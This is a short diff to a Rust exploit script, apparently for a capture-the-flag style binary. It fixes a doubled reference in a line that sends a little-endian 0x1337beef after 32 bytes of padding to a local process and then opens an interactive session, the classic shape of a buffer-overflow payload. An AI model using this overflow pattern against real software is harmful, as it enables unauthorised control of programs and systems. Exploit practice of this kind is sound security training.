@@ -12,7 +12,7 @@ fn main() -> io::Result<()> {
 
     let mut conn = Process::new(&opts.program)?;
     conn.send(&b"x".repeat(32))?;
-    conn.send(&&0x1337beef_u64.to_le_bytes())?;
+    conn.send(&0x1337beef_u64.to_le_bytes())?;
     conn.interactive()?;
     Ok(())
 }
